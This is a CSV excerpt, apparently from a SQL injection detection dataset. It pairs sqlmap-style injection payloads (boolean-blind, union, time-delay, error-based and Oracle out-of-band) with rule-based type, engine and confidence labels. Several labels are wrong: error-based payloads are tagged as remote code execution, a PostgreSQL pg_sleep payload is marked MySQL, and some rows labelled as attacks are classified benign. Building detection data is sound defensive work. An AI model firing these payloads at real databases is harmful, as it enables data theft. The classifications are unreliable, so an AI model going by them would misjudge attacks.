row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10500,"1' in boolean mode ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10501,"-8725"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""vblw"" like ""vblw",1,,boolean_blind,generic,0.95,") or (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
10502,1%' ) ),1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
10503,1' and 5835 = 6157 and 'bjee' like 'bjee,1,,boolean_blind,generic,0.95,"5835 = 6157 and, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
10504,"make_set ( 5679 = 9769,9769 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10505,1 ) where 5629 = 5629,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10506,"-4528"" ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""fxmt"" like ""fxmt",1,,boolean_blind,firebird,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on firebird",rule-based
10507,-7636' ) or 5898 = 8880 and ( 'sjuv' = 'sjuv,1,,boolean_blind,generic,0.95,5898 = 8880 and detected — boolean_blind injection (priority 8) on generic,rule-based
10508,"-3747"" ) union all select 8962,8962,8962,8962,8962#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10509,"-8893 ) union all select 7594,7594,7594,7594,7594,7594#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10510,1 ) or sleep ( 5 ) and ( 2211 = 2211,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10511,1'|| ( select 'lnhq' where 7526 = 7526,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10512,-8513 ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 5818 = 5818,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
10513,1%' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( '%' = ',1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10514,"1"" ) where 4520 = 4520",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10515,1' where 8945 = 8945 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,,boolean_blind,firebird,0.95,8945 = 8945 and detected — boolean_blind injection (priority 8) on firebird,rule-based
10516,"1%"" and 7533 = 7533 and ""%"" = """,1,,boolean_blind,generic,0.95,7533 = 7533 and detected — boolean_blind injection (priority 8) on generic,rule-based
10517,"-6996%"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
